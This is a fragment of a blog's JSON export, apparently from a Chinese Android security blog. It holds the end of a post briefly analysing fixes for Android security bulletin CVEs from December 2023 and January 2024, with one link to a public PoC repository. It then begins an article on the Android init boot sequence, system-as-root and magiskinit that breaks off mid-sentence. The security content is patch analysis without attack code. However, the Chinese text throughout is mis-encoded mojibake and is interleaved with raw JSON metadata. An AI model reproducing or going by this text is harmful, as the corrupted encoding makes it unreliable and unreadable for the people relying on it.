åœ¨2024å¹´1æœˆè¿˜èƒ½å‡ºç°è¿™ä¹ˆç®€å•ç›´æ¥çš„æ¼æ´ç¡®å®æœ‰ç‚¹ä¸å¯æ€è®®ã€‚è¿™ä¸ªè¡¥ä¸æ—©åœ¨2022å¹´å°±åˆ›å»ºäº†ï¼Œè€Œä¸”æ›´æ–°çš„ç‰ˆæœ¬åˆ—è¡¨é‡Œå¹¶æ²¡æœ‰æœ€æ–°çš„14ï¼Œäºæ˜¯æˆ‘å»çœ‹äº†ä¸‹14çš„ä»£ç å‘ç°ç¡®å®å·²ç»åˆè¿›äº†è¿™ä¸ªè¡¥ä¸ï¼Œç„¶åæˆ‘æœç´¢è¿™ä¸ªè¡¥ä¸ï¼Œå‘ç°è¿™ä¸ªæ¼æ´æ—©åœ¨2022å¹´å°±è¢«ç¡®è®¤å¹¶è¢«æˆäºˆ CVE-2022-20550 è¿™ä¸ªç¼–å·ï¼Œä½†æ˜¯è°·æ­Œå½“æ—¶ä¸çŸ¥é“æ€ä¹ˆæƒ³çš„åªç»™äº† moderate è¯„çº§ç„¶ååªç»™ pixel ä¿®äº†ã€‚ã€‚ã€‚CVE-2024-0018 EoP Highlibstagefright é‡Œæ— ç¬¦å·æ•°è¿ç®—ä¸å½“å¯¼è‡´æ„å¤–ç»“æœçš„æ¼æ´ã€‚CVE-2024-0019 ID HighSystem UI è¿›ç¨‹é‡å¯åï¼Œå¦‚æœåœ¨é‡å¯ä¹‹å‰æœ‰åº”ç”¨åœ¨è¿›è¡Œæ•æ„Ÿæ“ä½œï¼Œå¹¶ä¸”ç°åœ¨è¿˜æ²¡ç»“æŸï¼Œé‚£ä¹ˆä»ç„¶åº”è¯¥æ˜¾ç¤ºéšç§æŒ‡ç¤ºå™¨ã€‚SystemCVE-2024-0021 EoP Highç¦æ­¢å·¥ä½œç©ºé—´ï¼ˆwork profileï¼‰å†…çš„åº”ç”¨ç›‘å¬é€šçŸ¥ï¼Œåªç»™ 13 14 æ›´æ–°äº†ï¼Œåº”è¯¥æ˜¯ä»¥å‰æ­£å¸¸çš„åŠŸèƒ½ï¼Œå¤§ç‰ˆæœ¬è¿­ä»£ä¸å°å¿ƒå¼•å…¥ã€‚CVE-2024-0017 ID HighCamera2 å¦‚æœæ˜¯è¢«å…¶ä»– app å¯åŠ¨ï¼Œè€Œä¸”å¯åŠ¨å®ƒçš„è¿™ä¸ª app æ²¡æœ‰ä½ç½®æƒé™ï¼Œè¿”å›çš„ç…§ç‰‡ exif ä¿¡æ¯é‡Œä¸åº”è¯¥åŒ…å«ä½ç½®ä¿¡æ¯ã€‚ä¹‹å‰çš„ä»£ç é‡Œæœ‰åšåˆ¤æ–­ï¼Œä½†æ˜¯æœ‰é—®é¢˜ï¼ŒgetCallingPackage è¿”å› null çš„æ—¶å€™ä¸€å¾‹åˆ¤å®šä¸ºä¸æ˜¯ app å¯åŠ¨ä¸éœ€è¦è¿‡æ»¤ï¼Œä½†æ˜¯å¦‚æœ app ç”¨ startActivity è€Œé startActivityForResult ï¼ŒgetCallingPackage æœ¬æ¥å°±ä¼šè¿”å› nullï¼Œç®—æ˜¯é€»è¾‘ bugã€‚CVE-2024-0020 ID Highè®¾ç½®é“ƒå£°çš„æ—¶å€™æ£€æŸ¥ä¼ å…¥çš„ URIï¼Œé˜²æ­¢æŒ‡å‘åˆ«çš„ç”¨æˆ·çš„æ•°æ®ã€‚æœ€è¿‘è¿™ç§é—®é¢˜ä¼¼ä¹å¾ˆå¤šå¾ˆå¤šã€‚2023-12-01å¯èƒ½åœ¨é‡è¢«ç§¯æåˆ©ç”¨çš„æ¼æ´ï¼šCVE-2023-33063ã€CVE-2023-33107ã€CVE-2023-33106FrameworkCVE-2023-40077 EoP Criticallibstagefright é‡Œçš„ UAF é—®é¢˜CVE-2023-40076 ID CriticalCredentialManagerUi è·‘åœ¨ system_serverï¼Œä¸”åˆ›å»º PendingIntent çš„æ—¶å€™æ²¡æœ‰æŒ‡å®šç”¨æˆ·ï¼Œé»˜è®¤ä¼šå»ç”¨ context å¯¹åº”çš„ç”¨æˆ·ï¼Œç„¶åæŒ‡å‘ USER 0ï¼Œå…¶ä»–ç”¨æˆ·æ‹¿åˆ°è¿™ä¸ª PendingIntent ç„¶å send å°±èƒ½è·³è½¬åˆ°ä¸»ç”¨æˆ·çš„å‡­æ®ç®¡ç†é¡µé¢ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆå®šçº§è¿™ä¹ˆé«˜CVE-2023-40079 EoP HighShortcutService å¯åŠ¨ app ç»™å‡ºçš„ IntentSender æ—¶æŒ‡å®š MODE_BACKGROUND_ACTIVITY_START_DENIED é˜²æ­¢ BALCVE-2023-40089 EoP HighDevicePolicyService.getCredentialManagerPolicy éœ€è¦ä¼ å…¥ userIdã€‚æ„Ÿè§‰è¿™ä¸ªæ¼æ´çš„å®é™…å½±å“æƒ…å†µå¯èƒ½æ˜¯æœ‰è·¨ç”¨æˆ·æƒé™çš„è¿›ç¨‹éœ€è¦æ‹¿åˆ°å…¶ä»–ç”¨æˆ·çš„ä¸œè¥¿ä½†æ˜¯å› ä¸ºä¹‹å‰çš„è®¾è®¡é—®é¢˜æ‰€ä»¥æ‹¿ä¸åˆ°ï¼ŸCVE-2023-40094 EoP HighkeyguardGoingAway è¿™ä¸ªæ–¹æ³•æ²¡æ£€æŸ¥è°ƒç”¨è€…æƒé™ï¼Œç„¶åæ‰€æœ‰ app éƒ½èƒ½è°ƒç”¨è¿™ä¸ªæ–¹æ³•è§£é™¤é”å±ã€‚CVE-2023-40095 EoP Highåˆæ˜¯ä¸€ä¸ªå¿˜äº†æŒ‡å®šç¦æ­¢ BAL é€ æˆçš„ BAL bypassï¼Œè¿™æ¬¡æ˜¯ requestGeofence ã€‚CVE-2023-40096 EoP Highæ›´æ”¹çš„æ–‡ä»¶æ¯”è¾ƒå¤šï¼Œçœ‹èµ·æ¥æ˜¯è®¾ç½®å½•éŸ³æƒé™ä¸ºä»…å‰å°æ—¶åº”ç”¨é€€åˆ°åå°è¿˜ä¼šç»§ç»­å½•éŸ³çš„é—®é¢˜ã€‚CVE-2023-40103 EoP Highçœ‹æäº¤ä¿¡æ¯æ˜¯ç”¨ ApkAssets çš„æ—¶å€™æ”¹æˆç”¨åŸºäºå¼•ç”¨è®¡æ•°çš„æŒ‡é’ˆï¼Œé˜²æ­¢ UAF/double freeCVE-2023-45774 EoP HighShortcutService æ ¡éªŒä¼ å…¥çš„ uriã€‚çœ‹ cve æè¿°æ˜¯èƒ½æŒ‡å®šå…¶ä»–ç”¨æˆ·çš„å›¾åƒã€‚CVE-2023-45777 EoP Highæœ€çœ‹ä¸æ‡‚çš„ä¸€é›†ç»™äº†ä¸¤ä¸ªæäº¤ï¼Œç¬¬ä¸€ä¸ªæäº¤å’Œä¹æœˆä»½çš„ CVE-2023-35669 è¡¥ä¸æ˜¯ä¸€æ ·çš„ï¼Œå½“æ—¶è¿™ä¸ªæ¼æ´æè¿°æ˜¯ â€œthere is a possible way to control other running activitiesâ€ï¼Œç¬¬äºŒä¸ªæäº¤åªæ˜¯æŠŠå¼ƒç”¨ä¸å¸¦ç±»å‹çš„ getParcelable æ”¹æˆç±»å‹å®‰å…¨çš„ï¼Œç„¶è€Œåº•ä¸‹æ˜æ˜å°±æœ‰æ‰‹åŠ¨çš„ç±»å‹æ£€æŸ¥ï¼Œæˆ‘è§‰å¾—ç¼ºè¿™ä¸ªæäº¤ä¹Ÿæ²¡æ³•åˆ©ç”¨ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆåˆ†é…äº†ä¸€ä¸ª CVEã€‚çœ‹è¿™ä¸ª CVE çš„æè¿°æ˜¯èƒ½ Launch Anywhere ï¼Œä¸çŸ¥é“æ€ä¹ˆèƒ½åšåˆ°ã€‚AccountManagerService é‡Œä½¿ç”¨ä¸å¸¦å‚æ•°ç±»å‹çš„ getParcelable() æ–¹æ³•å¯èƒ½ä¼šå¯¼è‡´ååºåˆ—åŒ–å‡ºéé¢„æœŸçš„å¯¹è±¡ï¼Œè°ƒç”¨åˆ°å…¶ä»–ç±»çš„æ„é€ æ–¹æ³•ï¼Œå¯¼è‡´ parcel æ•°æ®è¢«ä¿®æ”¹ï¼Œç»•è¿‡ checkKeyIntentParceledCorrectly çš„ç¼“è§£æªæ–½ã€‚PoCï¼š https://github.com/michalbednarski/TheLastBundleMismatchCVE-2023-21267 ID Highåœ¨ lockdown æ¨¡å¼å§‹ç»ˆå±•ç¤ºé”å±ã€‚çœ‹èµ·æ¥æ˜¯æœ‰ app pinning çš„æ—¶å€™å°è¯• lockdown ä¼šå› ä¸ºé€»è¾‘é”™è¯¯è·³è¿‡æ˜¾ç¤ºé”å±ã€‚CVE-2023-40073 ID HighNotification style ç›¸å…³çš„ uri æ ¡éªŒCVE-2023-40081 ID HighMediaDataManager URI æ ¡éªŒã€‚æˆªæ­¢ç›®å‰å·²ç»æ˜¯ç¬¬ä¸‰ä¸ªäº†ã€‚CVE-2023-40092 ID HighShortcutService å¤šä¸ªå‡½æ•°æ£€æŸ¥ user idï¼Œé˜²æ­¢è·¨ç”¨æˆ·æ“ä½œCVE-2023-40074 DoS HighPersistableBundle å¿½ç•¥æ— æ•ˆæ•°æ®ï¼Œé˜²æ­¢æ‹’ç»æœåŠ¡ã€‚CVE-2023-40075 DoS Highé™åˆ¶èƒ½é€šè¿‡ addDynamicShortcuts æ·»åŠ çš„å¿«æ·æ–¹å¼çš„æ•°é‡ã€‚Systemè¿™é‡Œé¢å¤§éƒ¨åˆ†æ´éƒ½æ˜¯æ¯”è¾ƒä¼ ç»Ÿçš„å†…å­˜æŸåï¼Œæ‰€ä»¥è·³è¿‡äº†å¾ˆå¤šæ¼æ´ã€‚CVE-2023-40088 RCE Criticalè“ç‰™ç›¸å…³ï¼Œcom_android_bluetooth_btservice_AdapterService free callbackEnv è¿™ä¸ªæŒ‡é’ˆåæ²¡æœ‰ç½®ç©ºï¼Œå¯èƒ½å‘ç”Ÿ UAFã€‚ä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘çš„é”™è§‰ï¼Œæ€»æ„Ÿè§‰è¿‘å‡ ä¸ªæœˆèƒ½ RCE çš„æ¼æ´å¥½åƒå˜å¤šäº†ã€‚CVE-2023-40097 EoP Highç¦æ­¢åˆ›å»ºç›®æ ‡ä¸º Chooser çš„å¿«æ·æ–¹å¼ã€‚æ²¡çœ‹æ‡‚æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Œçœ‹ CVE æè¿°æ˜¯ URI grantã€‚CVE-2023-21394 ID Highæ·»åŠ  phone account æ—¶æ£€æŸ¥ç»™å®šçš„ URIï¼Œé˜²æ­¢è·¨ç”¨æˆ·è¯»å–å›¾ç‰‡ã€‚å—¯ï¼Œç¬¬å››ä¸ªäº†ã€‚CVE-2023-35668 ID Highåˆæ˜¯ URI ç›¸å…³çš„è·¨ç”¨æˆ·è¯»å–ï¼Œè¿™æ¬¡è¿˜æ˜¯ Notification é‡Œâ€¦â€¦CVE-2023-40098 ID Highçœ‹èµ·æ¥æ˜¯æœ‰ä¸ªå« priority conversation widget çš„ä¸œè¥¿ï¼Œå…¶ä»–ç”¨æˆ·æ·»åŠ è¿™ä¸ª widget èƒ½çœ‹è§ä¸»ç”¨æˆ·çš„é€šçŸ¥ã€‚è§£å†³æ–¹æ³•å°±æ˜¯ä¸è®©å…¶ä»–ç”¨æˆ·æ·»åŠ ã€‚","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"},{"name":"å®‰å…¨è¡¥ä¸åˆ†ææ ç›®","slug":"å®‰å…¨è¡¥ä¸åˆ†ææ ç›®","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90%E6%A0%8F%E7%9B%AE/"}]},{"title":"åœ¨æ•…äº‹å¼€å§‹ä¹‹å‰çš„æ•…äº‹ï¼šAndroid å¯åŠ¨è¿‡ç¨‹ä¸ magiskinit åˆ†æ","slug":"android-booting-shenanigans-and-magiskinit-analysing","date":"2023-11-12T07:00:00.000Z","updated":"2025-04-24T10:33:02.812Z","comments":true,"path":"2023/11/12/android-booting-shenanigans-and-magiskinit-analysing/","link":"","permalink":"https://blog.canyie.top/2023/11/12/android-booting-shenanigans-and-magiskinit-analysing/","excerpt":"ç»ˆäºå¼€äº†ä¸€ç›´æƒ³å†™çš„è¿™ç¯‡æ–‡ç« ï¼Œå†ä¸å†™ç‚¹ä¸œè¥¿å°±çœŸçš„æ˜¯å¹´æ›´åšå®¢äº†â€¦â€¦æœ¬æ–‡å¯ä»¥è®¤ä¸ºæ˜¯ Android Booting Shenanigans çš„ä¸­æ–‡è¡¥å……è¯´æ˜ï¼ŒåŒæ—¶æ·»åŠ äº† magiskinit çš„ä¸€äº›å¤„ç†ç»†èŠ‚ã€‚å³ä½¿ä½ å¯¹ magiskinit æ²¡å…´è¶£ä¹Ÿå¯ä»¥çœ‹çœ‹ï¼Œè¯´ä¸å®šå°±æœ‰ä¸€äº›ä½ å¹³æ—¶ä»æ¥æ²¡æ³¨æ„åˆ°çš„ç»†èŠ‚å‘¢ :)","text":"ç»ˆäºå¼€äº†ä¸€ç›´æƒ³å†™çš„è¿™ç¯‡æ–‡ç« ï¼Œå†ä¸å†™ç‚¹ä¸œè¥¿å°±çœŸçš„æ˜¯å¹´æ›´åšå®¢äº†â€¦â€¦æœ¬æ–‡å¯ä»¥è®¤ä¸ºæ˜¯ Android Booting Shenanigans çš„ä¸­æ–‡è¡¥å……è¯´æ˜ï¼ŒåŒæ—¶æ·»åŠ äº† magiskinit çš„ä¸€äº›å¤„ç†ç»†èŠ‚ã€‚å³ä½¿ä½ å¯¹ magiskinit æ²¡å…´è¶£ä¹Ÿå¯ä»¥çœ‹çœ‹ï¼Œè¯´ä¸å®šå°±æœ‰ä¸€äº›ä½ å¹³æ—¶ä»æ¥æ²¡æ³¨æ„åˆ°çš„ç»†èŠ‚å‘¢ :)Android Initåœ¨ä»‹ç» init æ‰§è¡Œè¿‡ç¨‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥ä»‹ç»ä¸€ä¸‹ init æ˜¯ä»€ä¹ˆã€‚init ç”± Linux å†…æ ¸ç›´æ¥å¯åŠ¨ï¼Œæ˜¯ Android å¯åŠ¨æ—¶ç”¨æˆ·ç©ºé—´çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Œå®ƒçš„ pid ä¸º 1ã€‚å®ƒæ‰¿æ‹…äº†æŒ‚è½½å…³é”®ç³»ç»Ÿåˆ†åŒºã€åŠ è½½ SELinux policyã€å¯åŠ¨ property serviceã€åŠ è½½å¹¶æ‰§è¡Œå¯åŠ¨è„šæœ¬ï¼ˆinit.rcï¼‰ç­‰é‡è¦å·¥ä½œã€‚æˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„ zygoteã€service manager ç­‰è¿›ç¨‹å°±æ˜¯è¢«å†™åœ¨äº† init.rc å†…ç”± init è´Ÿè´£å¯åŠ¨çš„ã€‚ç”±äº init è¿›ç¨‹çš„é‡è¦æ€§ï¼Œåœ¨å®‰å…¨å±‚é¢å®ƒè¢«è§†ä¸ºå†…æ ¸çš„ç­‰æ•ˆç»„ä»¶ä¹‹ä¸€ã€‚æŠ›å¼€ç»†èŠ‚ä¸è°ˆï¼Œinit æ‰€åšçš„é‡è¦çš„äº‹æƒ…å¤§æ¦‚æœ‰è¿™äº›ï¼šæŒ‚è½½ /dev /proc /sys ç­‰é‡è¦æ–‡ä»¶ç³»ç»Ÿï¼Œåˆ›å»º /dev/urandom ç­‰è®¾å¤‡åŠ è½½ SELinux policy è¿› kernelå¯åŠ¨ property service å¤„ç† setprop ç­‰äº‹ä»¶æ‰§è¡Œ init.rcï¼Œå®Œæˆç³»ç»Ÿå‰©ä½™çš„å¯åŠ¨æµç¨‹ï¼Œå¦‚è§£å¯† userdataã€å¯åŠ¨ zygote ç­‰æ—§ rootfs æ—¶ä»£çº¯ç²¹çš„ initAndroid 5.0.2 init.cï¼Œç‚¹è¿›å»æœç´¢ main æŸ¥çœ‹æºç ï¼Œæ•´ä¸ªé€»è¾‘éå¸¸æ¸…æ™°ï¼Œå¤§æ¦‚å°±æ˜¯ä¸Šé¢çš„åˆ—è¡¨åšçš„äº‹æƒ…ï¼Œæ²¡ä»€ä¹ˆå¥½è®²çš„ã€‚åœ¨è¿™ä¸ªæ—¶å€™ï¼Œå¯åŠ¨æµç¨‹å¤§æ¦‚å¦‚ä¸‹æ‰€ç¤ºï¼šBootloader åŠ è½½ boot.imgè§£å‹è¿è¡Œé‡Œé¢çš„ kernelkernel åˆå§‹åŒ–åï¼Œè°ƒç”¨ populate_rootfs() å°† boot.img å†…çš„ ramdisk é‡Šæ”¾åˆ° /è¿è¡Œ /initï¼Œæ­¤æ—¶å› ä¸º / è¿™ä¸ªæ ¹æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶æ˜¯ä» boot.img çš„ ramdisk ä¸­æ¥çš„ï¼Œæ‰€ä»¥ä¼šè¿è¡Œ boot ramdisk é‡Œçš„ initinit å®Œæˆç”¨æˆ·ç©ºé—´çš„åˆå§‹åŒ–å·¥ä½œï¼Œç»§ç»­å¼€æœºåˆ°äº† Android 6.0 init.cppï¼Œäº‹æƒ…å‘ç”Ÿäº†ä¸€äº›å˜åŒ–ï¼šinit åˆ†äº†é˜¶æ®µã€‚kernel ç›´æ¥å¯åŠ¨æ—¶ï¼Œinit å¤„åœ¨â€œä¸€é˜¶æ®µâ€ï¼Œæ­¤æ—¶ init éœ€è¦åšä¸€äº›ç”¨æˆ·ç©ºé—´çš„åˆå§‹åŒ–å·¥ä½œï¼ŒåŠ è½½ SELinux policyï¼Œè€Œæ­¤æ—¶å› ä¸º init ç”± kernel ç›´æ¥å¯åŠ¨ï¼Œå®ƒçš„ SELinux context ä¼šæ˜¯ u:r:kernel:s0ï¼Œæ‰€ä»¥å®ƒä¼š exec å®ƒæœ¬èº«æ¥ transition åˆ°å®ƒä¸“å±çš„ SELinux domainï¼ˆu:r:init:s0ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸Šé¢çš„ç¬¬ 5 æ­¥è¢«æ‹†åˆ†ä¸ºä¸‹é¢å‡ å°æ­¥ï¼šè¿›è¡ŒæŒ‚è½½ /dev ç­‰å¿…è¦çš„åˆå§‹åŒ–åŠ è½½ SELinux policyé‡æ–°æ‰§è¡Œ init æœ¬èº«ï¼Œè®©è¿›ç¨‹çš„ SELinux domain ç”± kernel è½¬æ¢åˆ° initå®Œæˆå‰©ä¸‹çš„åˆå§‹åŒ–ï¼Œç»§ç»­å¼€æœºè¿™å°±æ˜¯ä»¥å‰ Android è®¾å¤‡å¯åŠ¨çš„æ–¹å¼ã€‚å¦‚æœä½ åœ¨è¿™äº›è®¾å¤‡å¼€æœºå®ŒæˆåæŸ¥çœ‹ mounts ä½ ä¼šçœ‹è§è¿™æ ·çš„ä¸œè¥¿ï¼š1rootfs &#x2F; rootfs ro,relatime 0 0è¿™ä»£è¡¨ / çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹æ˜¯ rootfsï¼Œè€Œ rootfs æ˜¯ç”± kernel æŒ‚è½½ boot.img å†…çš„ ramdisk ä¸Šå»çš„ã€‚Project Treble å¸¦æ¥çš„æ—§å¼ system-as-root åˆ†åŒºå¸ƒå±€åˆ°äº† Android 8.0 æ—¶ä»£ï¼ˆå…¶å®ä» 7.1 å°±å¼€å§‹å‡†å¤‡äº†ï¼‰ï¼ŒGoogle æ¨å‡ºäº† Project Trebleã€‚ä¸ºäº†å®ç° Project Treble åŠç›¸å…³çš„ Generic System Imageï¼Œ/ éœ€è¦å’Œç³»ç»Ÿç›¸ç»‘å®šã€‚Google é€‰æ‹©äº†æ¨å‡ºåä¸º system-as-root ï¼ˆä»¥ä¸‹ç®€ç§°ä¸º SARï¼‰çš„æ–°åˆ†åŒºå¸ƒå±€ã€‚ç®€å•æ¥è¯´ï¼Œ/ è¿™ä¸ªæ ¹æ–‡ä»¶ç³»ç»Ÿä¸­çš„å†…å®¹ä¸å†æ¥è‡ª boot.img å†…çš„ ramdiskï¼Œè€Œæ˜¯æ¥è‡ª system.imgã€‚ä¸ºäº†å®ç°è¿™ä¸€è¡Œä¸ºï¼Œè®¾å¤‡çš„ bootloader åœ¨å¯åŠ¨å†…æ ¸æ—¶ä¼šä¼ é€’å¯åŠ¨å‚æ•° skip_initramfsï¼Œè®¾å¤‡çš„å†…æ ¸ä¼šçœ‹è§è¿™ä¸€å‚æ•°ï¼Œä»è€Œè·³è¿‡ boot.img å†…çš„ ramdisk è€Œæ˜¯ç›´æ¥æŒ‚è½½ system.img åˆ° /ã€‚å¦‚æœä½ åœ¨è¿™äº›è®¾å¤‡ä¸ŠæŸ¥çœ‹ mountsï¼Œä½ ä¼šå‘ç° / çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹å˜æˆäº† ext4ï¼ˆæˆ– erofsï¼Ÿï¼‰è€Œä¸æ˜¯ rootfsã€‚åŒæ—¶ï¼Œè¿˜å‡ºç°äº†ä¸€ä¸ªæ–°çš„ä¸œè¥¿ï¼ŒA/B (Seamless) System Update ï¼ˆå³æ‰€è°“çš„ A/B åˆ†åŒºï¼‰ã€‚è®¾å¤‡çš„ boot/system/vendor ç­‰å…³é”®åˆ†åŒºç°åœ¨å…¶å®æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªä¼šè¢«ä½¿ç”¨ï¼Œè€Œå¦ä¸€ä¸ªç”¨ä½œåå¤‡ã€‚å½“ç³»ç»Ÿæ›´æ–°çš„æ—¶å€™ï¼Œæ›´æ–°åŒ…å…¶å®ä¼šè¢«å†™å…¥åå¤‡åˆ†åŒºã€‚è¿™æ ·çš„å¥½å¤„æ—¶ï¼Œå½“æ›´æ–°å¯¼è‡´æ— æ³•å¼€æœºçš„æ—¶å€™ï¼Œå› ä¸ºæœ‰å¦ä¸€ä¸ªåˆ†åŒºå­˜å‚¨ç€å¯ä»¥å¼€æœºçš„ç³»ç»Ÿï¼Œè®¾å¤‡å¯ä»¥è‡ªåŠ¨å›é€€åˆ°ä¸Šä¸€ä¸ªå¯ä»¥å¼€æœºçš„ç‰ˆæœ¬ã€‚å‰¯ä½œç”¨ä¹Ÿå¾ˆæ˜æ˜¾ï¼šè¿™äº›åˆ†åŒºæœ¬æ¥åªéœ€è¦ä¸€ä¸ªçš„ï¼Œç°åœ¨æ¯ä¸ªéƒ½éœ€è¦ä¸¤ä¸ªï¼Œç›´æ¥ double äº†ï¼Œéœ€è¦æ›´å¤§çš„å­˜å‚¨ç©ºé—´ï¼ˆä¹‹å Google è¿˜å¼•å…¥äº† Virtual A/Bï¼Œä¸è¿‡è¿™éƒ½æ˜¯åè¯äº†ï¼Œå¯¹æˆ‘ä»¬ä¸é‡è¦ï¼‰ã€‚æ€ä¹ˆå‡å°‘è¦ç”¨çš„å­˜å‚¨ç©ºé—´å‘¢ï¼Ÿåœ¨ä¹‹å‰ï¼ŒAndroid è®¾å¤‡éœ€è¦ä¸€ä¸ª recovery åˆ†åŒºï¼Œé‡Œé¢å­˜å‚¨ç€ä¸€ä¸ªå°å‹çš„ Linux ç³»ç»Ÿï¼Œç”¨äºåœ¨è®¾å¤‡æ— æ³•å¼€æœºæ—¶å¯ä»¥è¿›å…¥ recovery æ¨¡å¼ï¼Œä»è€Œæ¢å¤ç³»ç»Ÿã€‚è™½ç„¶å¼•å…¥äº† A/B åˆ†åŒºï¼Œä½†æ˜¯ recovery æ¨¡å¼ä»ç„¶éœ€è¦ä¿ç•™ï¼Œè€Œ recovery åˆ†åŒºåˆ™ä¸ä¸€å®šã€‚å¯¹äº A/B è®¾å¤‡æ¥è¯´ï¼Œç”±äº boot ç°åœ¨æœ‰ä¸¤ä¸ªï¼Œå³ä½¿å…¶ä¸­ä¸€ä¸ªåˆ†åŒºå› ä¸ºä¸å®Œæ•´çš„ç³»ç»Ÿæ›´æ–°è¢«ç ´åï¼Œå¦ä¸€ä¸ªä¹Ÿå­˜å‚¨ç€å®Œæ•´çš„ã€æœªå—ç ´åçš„ boot.imgï¼Œæ‰€ä»¥ boot è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯å¯ç”¨çš„ï¼›è€Œæ­£å¸¸å¼€æœºçš„æ—¶å€™ï¼Œå†…æ ¸ä¼šç›´æ¥æŒ‚è½½ system.img åˆ° /ï¼Œboot å†…çš„ ramdisk æœªè¢«ä½¿ç”¨ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥æ”¾ recovery çš„ ramdiskã€‚æ­¤æ—¶ï¼Œè®¾å¤‡çš„å¼€æœºæµç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼šbootloader åˆ¤æ–­è®¾å¤‡æ˜¯æ­£å¸¸å¯åŠ¨ï¼Œè¿˜æ˜¯è¦å¯åŠ¨åˆ° recoveryå¦‚æœæ˜¯æ­£å¸¸å¯åŠ¨ï¼Œä¼ é€’å‚æ•° skip_initramfså†…æ ¸å¦‚æœçœ‹è§äº† bootloader ä¼ é€’è¿‡æ¥çš„ skip_initramfsï¼Œå°±ä»£è¡¨è®¾å¤‡è¦æ­£å¸¸å¯åŠ¨ï¼Œç›´æ¥æŒ‚è½½ system.img åˆ° /ï¼›å¦åˆ™å°±æ˜¯è¦å¯åŠ¨åˆ° recoveryï¼Œå› ä¸º recovery çš„ ramdisk ç°åœ¨åŒæ ·æ”¾åœ¨ bootï¼Œé‡Šæ”¾ boot.img é‡Œçš„ ramdisk åˆ° /æ‰§è¡Œ initï¼Œç»§ç»­å¯åŠ¨æµç¨‹ã€‚å¯¹äºæ­£å¸¸å¼€æœºï¼Œè¿™é‡Œ init ç›´æ¥æ¥è‡ª system.imgã€‚è€Œå¯¹äºé A/B çš„è®¾å¤‡ï¼Œå› ä¸º boot åªæœ‰ä¸€ä¸ªï¼Œå¯èƒ½ä¼šåœ¨ OTA ä¸­è¢«ç ´åï¼Œä¸ºäº†ä¿è¯è®¾å¤‡å§‹ç»ˆæœ‰å¯ç”¨çš„ recoveryï¼Œå®ƒä»¬ä»ç„¶ä¿ç•™äº† recovery åˆ†åŒºã€‚boot å†…çš„ ramdisk æ ¹æœ¬ä¸ä¼šè¢«ä½¿ç”¨åˆ°ï¼Œæ‰€ä»¥ boot.img å†…æ ¹æœ¬æ²¡æœ‰ ramdiskï¼ŒåŒæ—¶è®¾å¤‡çš„ bootloader å¯èƒ½ä¼šç›´æ¥æŠŠ boot ramdisk ç»™æ’é™¤æ‰ï¼ˆçœ‹ OEM æ€ä¹ˆå®ç°çš„ï¼Œåƒä¸‰æ˜Ÿç­‰å¤§éƒ¨åˆ†å‚å•†å°±ä¼šæ’é™¤ï¼Œä½†æ˜¯å°ç±³ç­‰å°éƒ¨åˆ†å‚å•†å°±ä¸ä¼šï¼‰ã€‚è™½ç„¶ Google åœ¨æ¨å‡ºå®ƒæ—¶å°†å…¶ç›´æ¥ç§°ä¸º system-as-rootï¼Œä½†ä¸ºäº†ä¸ä¸‹æ–‡çš„ 2-Stage-Init System-as-root åŒºåˆ†å¼€æ¥ï¼Œæˆ‘ä»¬æŠŠå®ƒç§°ä¸º Legacy SARã€‚Legacy SAR å¯¹äºå‡ºå‚ç‰ˆæœ¬åœ¨ Android 9.0 ä»¥ä¸‹çš„è®¾å¤‡æ˜¯å¯é€‰çš„ï¼Œä½†å¯¹äºå‡ºå‚ Android 9.0 çš„è®¾å¤‡æ˜¯å¼ºåˆ¶çš„ã€‚Android 10+ï¼šæœ‰ä¸‰æ­¥çš„ä¸¤æ­¥å¯åŠ¨ï¼éšç€æ—¶é—´ç»§ç»­æ¨ç§»ï¼Œåˆ° Android 10 æ—¶ï¼ŒGoogle æ¨å‡ºäº†åŠ¨æ€åˆ†åŒºã€‚å¯¹äºä¸Šæ–‡æåˆ°çš„ Legacy SAR æ¥è¯´ï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œå› ä¸º Linux å†…æ ¸æ— æ³•ç›´æ¥ç†è§£è¿™ç§æ–°çš„åˆ†åŒºæ ¼å¼ï¼Œæ— æ³•å°† system æŒ‚è½½åˆ° /ã€‚Google çš„è§£å†³åŠæ³•æ˜¯ï¼šç»§ç»­é‡å†™ï¼Œå‘æ˜æ–°çš„å¯åŠ¨æ–¹å¼ï¼æ–°çš„å¯åŠ¨æ–¹å¼åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼šåƒæ—§å¼ rootfs ä¸€æ ·ï¼Œboot.img å†…çš„ ramdisk ä¼šè¢«é‡Šæ”¾åˆ° /æ‰§è¡Œ /initï¼Œæ‰€ä»¥ boot.img å†…çš„ /init ä¼šè¢«æ‰§è¡Œinit è¿›å…¥â€œç¬¬ä¸€é˜¶æ®µâ€ï¼Œåˆå§‹åŒ–ç”¨æˆ·ç©ºé—´ï¼ŒæŒ‚è½½ /systemæ‰§è¡Œä¸€ä¸ª switch root æ“ä½œï¼Œå°† rootdir åˆ‡æ¢åˆ° /systemã€‚ç°åœ¨çš„ / å…¶å®æ˜¯ switch root ä¹‹å‰çš„ /systemã€‚æ­¤æ—¶ï¼Œè®¾å¤‡çš„åˆ†åŒºå¸ƒå±€ç”±æ—§å¼çš„ rootfs å˜ä¸º system-as-rootã€‚æ¥ä¸‹æ¥æ˜¯åŠ è½½ SELinux policyï¼Œè€Œè¿™ä¸€æ­¥åº”è¯¥å’Œ system 